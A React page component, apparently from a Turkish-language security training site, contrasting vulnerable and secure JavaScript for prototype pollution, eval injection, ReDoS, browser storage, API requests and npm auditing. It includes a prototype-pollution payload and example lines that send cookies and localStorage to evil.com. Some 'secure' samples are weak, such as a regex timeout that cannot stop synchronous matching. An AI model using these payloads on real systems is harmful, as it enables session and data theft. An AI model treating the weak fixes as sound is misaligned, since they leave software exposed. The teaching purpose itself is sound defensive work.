import { Braces, Shield, AlertTriangle, CheckCircle, ArrowLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import CodeExample from "@/components/CodeExample";
import { Link } from "react-router-dom";

const JavaScriptSecurity = () => {
  return (
    <div className="min-h-screen py-8 px-4">
      <div className="container mx-auto max-w-5xl">
        <div className="flex items-center space-x-4 mb-8 animate-fade-in">
          <Button variant="ghost" size="icon" asChild>
            <Link to="/"><ArrowLeft className="w-5 h-5" /></Link>
          </Button>
          <Braces className="w-10 h-10 text-primary animate-security-pulse" />
          <div>
            <h1 className="text-3xl font-bold gradient-text">JavaScript Güvenlik Dersleri</h1>
            <p className="text-muted-foreground">JavaScript'te yaygın güvenlik açıkları ve çözümleri</p>
          </div>
        </div>

        <Tabs defaultValue="prototype" className="space-y-6">
          <TabsList className="grid grid-cols-2 md:grid-cols-5 gap-2 h-auto p-2">
            <TabsTrigger value="prototype" className="text-xs">Prototype Pollution</TabsTrigger>
            <TabsTrigger value="eval" className="text-xs">eval & Injection</TabsTrigger>
            <TabsTrigger value="storage" className="text-xs">Storage Güvenliği</TabsTrigger>
            <TabsTrigger value="api" className="text-xs">API Güvenliği</TabsTrigger>
            <TabsTrigger value="deps" className="text-xs">Bağımlılık Güvenliği</TabsTrigger>
          </TabsList>

          <TabsContent value="prototype" className="space-y-6">
            <Card className="security-card animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <AlertTriangle className="w-5 h-5 text-destructive" />
                  <span>Prototype Pollution Saldırısı</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">
                  JavaScript'in prototype chain yapısını kötüye kullanarak tüm nesnelere zararlı özellikler ekleme saldırısı.
                </p>
              </CardContent>
            </Card>

            <CodeExample
              title="Prototype Pollution"
              description="Object merge işlemlerinde prototype zehirlenmesi"
              type="vulnerable"
              language="javascript"
              vulnerableCode={`// ❌ Güvensiz: Derin merge fonksiyonu
function deepMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Saldırgan bu veriyi gönderir:
const maliciousPayload = JSON.parse(
  '{"__proto__": {"isAdmin": true}}'
);

const userConfig = {};
deepMerge(userConfig, maliciousPayload);

// Artık TÜM nesnelerde isAdmin = true!
const normalUser = {};
console.log(normalUser.isAdmin); // true! 💀`}
              secureCode={`// ✅ Güvenli: Prototype pollution korumalı merge
function safeMerge(target, source) {
  const FORBIDDEN_KEYS = [
    '__proto__', 'constructor', 'prototype'
  ];
  
  for (let key of Object.keys(source)) {
    // Tehlikeli key'leri engelle
    if (FORBIDDEN_KEYS.includes(key)) continue;
    
    // hasOwnProperty kontrolü
    if (!Object.prototype.hasOwnProperty
        .call(source, key)) continue;
    
    if (typeof source[key] === 'object' 
        && source[key] !== null
        && !Array.isArray(source[key])) {
      target[key] = safeMerge(
        target[key] || Object.create(null), 
        source[key]
      );
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Object.create(null) ile prototype'sız nesne
const config = Object.create(null);
safeMerge(config, userInput);

// Veya Map kullanın
const safeConfig = new Map();
safeConfig.set('theme', userInput.theme);`}
            />
          </TabsContent>

          <TabsContent value="eval" className="space-y-6">
            <Card className="security-card animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <AlertTriangle className="w-5 h-5 text-destructive" />
                  <span>eval() ve Kod Enjeksiyonu</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">
                  eval(), Function(), setTimeout(string) gibi dinamik kod çalıştırma yöntemleri büyük güvenlik riskleri taşır.
                </p>
              </CardContent>
            </Card>

            <CodeExample
              title="eval() Tehlikesi"
              description="Dinamik kod çalıştırma ve alternatif güvenli yöntemler"
              type="vulnerable"
              language="javascript"
              vulnerableCode={`// ❌ Güvensiz: eval kullanımı
function calculate(expression) {
  // Kullanıcı "2+2" yerine kötü kod girebilir
  return eval(expression);
}
// Saldırı: calculate("fetch('https://evil.com?cookie='+document.cookie)")

// ❌ Güvensiz: setTimeout ile string
setTimeout("alert('XSS')", 1000);

// ❌ Güvensiz: Function constructor
const fn = new Function('return ' + userInput);
fn();

// ❌ Güvensiz: innerHTML
element.innerHTML = userInput;

// ❌ Güvensiz: document.write
document.write(userInput);`}
              secureCode={`// ✅ Güvenli: Matematiksel ifade parser
function safeCalculate(expression) {
  // Sadece rakam ve operatörlere izin ver
  const sanitized = expression.replace(/[^0-9+\\-*/.() ]/g, '');
  
  if (sanitized !== expression) {
    throw new Error('Geçersiz karakter tespit edildi');
  }
  
  // Güvenli math library kullanın
  // Örn: mathjs kütüphanesi
  // const math = require('mathjs');
  // return math.evaluate(sanitized);
  
  // Basit parser
  return Function('"use strict"; return (' + sanitized + ')')();
}

// ✅ Güvenli: setTimeout ile fonksiyon
setTimeout(() => {
  console.log('Güvenli timeout');
}, 1000);

// ✅ Güvenli: DOM manipülasyonu
element.textContent = userInput;

// ✅ Güvenli: Template literal ile DOM
const safe = document.createElement('div');
safe.textContent = userInput;
container.appendChild(safe);`}
            />

            <CodeExample
              title="Regex DoS (ReDoS)"
              description="Kötü niyetli regex ile servis dışı bırakma saldırısı"
              type="vulnerable"
              language="javascript"
              vulnerableCode={`// ❌ Güvensiz: Backtracking'e açık regex
const emailRegex = /^([a-zA-Z0-9]+)*@example\\.com$/;

// Bu input regex motorunu kilitler:
const evil = 'a'.repeat(50) + '!';
emailRegex.test(evil); // Uzun süre çalışır!

// Diğer tehlikeli regex kalıpları:
const bad1 = /(a+)+$/;
const bad2 = /([a-zA-Z]+)*$/;
const bad3 = /(a|aa)+$/;`}
              secureCode={`// ✅ Güvenli: Optimize edilmiş regex
const safeEmailRegex = /^[a-zA-Z0-9._%+-]+@example\\.com$/;

// ✅ Input uzunluğunu sınırla
function safeRegexTest(pattern, input, maxLength = 1000) {
  if (input.length > maxLength) {
    throw new Error('Input çok uzun');
  }
  return pattern.test(input);
}

// ✅ Timeout ile regex
function regexWithTimeout(pattern, input, ms = 100) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error('Regex timeout'));
    }, ms);
    
    try {
      const result = pattern.test(input);
      clearTimeout(timer);
      resolve(result);
    } catch (e) {
      clearTimeout(timer);
      reject(e);
    }
  });
}

// ✅ re2 kütüphanesi (Node.js)
// const RE2 = require('re2');
// const safePattern = new RE2('^[a-z]+$');`}
            />
          </TabsContent>

          <TabsContent value="storage" className="space-y-6">
            <Card className="security-card animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Shield className="w-5 h-5 text-primary" />
                  <span>localStorage & sessionStorage Güvenliği</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">
                  Tarayıcı storage'ında hassas veri saklama riskleri ve güvenli alternatifler.
                </p>
              </CardContent>
            </Card>

            <CodeExample
              title="Güvenli Storage Kullanımı"
              description="Hassas verileri tarayıcıda güvenli saklama"
              type="vulnerable"
              language="javascript"
              vulnerableCode={`// ❌ Güvensiz: Hassas veri localStorage'da
localStorage.setItem('authToken', 'eyJhbGci...');
localStorage.setItem('creditCard', '4111-1111-1111-1111');
localStorage.setItem('password', 'userPassword123');

// XSS saldırısı ile tüm veriler çalınır:
// fetch('https://evil.com/steal?data=' + 
//   JSON.stringify(localStorage));

// ❌ Güvensiz: JSON parse hatası yönetilmiyor
const data = JSON.parse(localStorage.getItem('user'));
// data null olabilir → crash!`}
              secureCode={`// ✅ Güvenli Storage Wrapper
class SecureStorage {
  // Hassas verileri şifreli sakla
  static async encrypt(data, key) {
    const encoder = new TextEncoder();
    const cryptoKey = await crypto.subtle.importKey(
      'raw', encoder.encode(key.padEnd(32)),
      'AES-GCM', false, ['encrypt']
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      cryptoKey,
      encoder.encode(JSON.stringify(data))
    );
    
    return {
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted))
    };
  }
  
  // Güvenli get
  static safeGet(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch {
      return defaultValue;
    }
  }
  
  // Token'lar için httpOnly cookie tercih edin
  // localStorage yerine!
}

// ✅ Token yönetimi: httpOnly cookie (sunucu tarafı)
// Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict`}
            />
          </TabsContent>

          <TabsContent value="api" className="space-y-6">
            <Card className="security-card animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Shield className="w-5 h-5 text-primary" />
                  <span>Frontend API Güvenliği</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">
                  Fetch/XHR isteklerinde güvenlik, CORS, ve API key yönetimi.
                </p>
              </CardContent>
            </Card>

            <CodeExample
              title="Güvenli API İstekleri"
              description="Fetch API ile güvenli istek gönderme"
              type="vulnerable"
              language="javascript"
              vulnerableCode={`// ❌ Güvensiz: API anahtarı frontend'de
const API_KEY = 'sk-secret-key-12345';

fetch('https://api.service.com/data', {
  headers: { 'Authorization': 'Bearer ' + API_KEY }
});

// ❌ Güvensiz: Hata detayları kullanıcıya
fetch('/api/user')
  .then(r => r.json())
  .catch(err => {
    document.body.innerHTML = err.stack; // Stack trace!
  });

// ❌ Güvensiz: CORS herhangi bir origin
// Access-Control-Allow-Origin: *`}
              secureCode={`// ✅ Güvenli API İstek Wrapper
class ApiClient {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
  }
  
  async request(endpoint, options = {}) {
    const controller = new AbortController();
    const timeoutId = setTimeout(
      () => controller.abort(), 10000
    );
    
    try {
      const response = await fetch(
        this.baseUrl + endpoint, 
        {
          ...options,
          signal: controller.signal,
          credentials: 'same-origin', // Cookie gönder
          headers: {
            'Content-Type': 'application/json',
            // CSRF token ekle
            'X-CSRF-Token': this.getCsrfToken(),
            ...options.headers
          }
        }
      );
      
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        // Genel hata mesajı, detay yok
        throw new Error('İstek başarısız');
      }
      
      return await response.json();
    } catch (error) {
      clearTimeout(timeoutId);
      
      if (error.name === 'AbortError') {
        throw new Error('İstek zaman aşımına uğradı');
      }
      
      // Hata logla ama kullanıcıya genel mesaj göster
      console.error('API Error:', error);
      throw new Error('Bir hata oluştu');
    }
  }
  
  getCsrfToken() {
    return document.querySelector(
      'meta[name="csrf-token"]'
    )?.content || '';
  }
}

// API key'leri backend proxy üzerinden kullanın!
const api = new ApiClient('/api');
const data = await api.request('/users');`}
            />
          </TabsContent>

          <TabsContent value="deps" className="space-y-6">
            <Card className="security-card animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <AlertTriangle className="w-5 h-5 text-destructive" />
                  <span>Bağımlılık Güvenliği</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">
                  npm paketleri ve üçüncü parti kütüphanelerdeki güvenlik riskleri.
                </p>
              </CardContent>
            </Card>

            <CodeExample
              title="npm Güvenlik Kontrolleri"
              description="Bağımlılıkları güvenlik açısından denetleme"
              type="secure"
              language="bash"
              secureCode={`# Güvenlik denetimi çalıştır
npm audit

# Otomatik düzeltme
npm audit fix

# Sadece production bağımlılıkları
npm audit --production

# Lockfile bütünlüğü kontrolü
npm ci  # (clean install - lockfile'a uyar)

# Paket içeriğini incele (yüklemeden önce)
npm pack <paket-adı> --dry-run

# Bilinen zafiyet tarama
npx snyk test

# Lisans kontrolü
npx license-checker --onlyAllow "MIT;ISC;Apache-2.0"

# package.json güvenlik ayarları
# {
#   "scripts": {
#     "preinstall": "npx npm-force-resolutions",
#     "audit": "npm audit --audit-level=high"
#   },
#   "overrides": {
#     "vulnerable-package": ">=2.0.0"
#   }
# }

# .npmrc güvenlik ayarları
# ignore-scripts=true  (postinstall script'leri engelle)
# audit=true
# fund=false`}
            />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default JavaScriptSecurity;
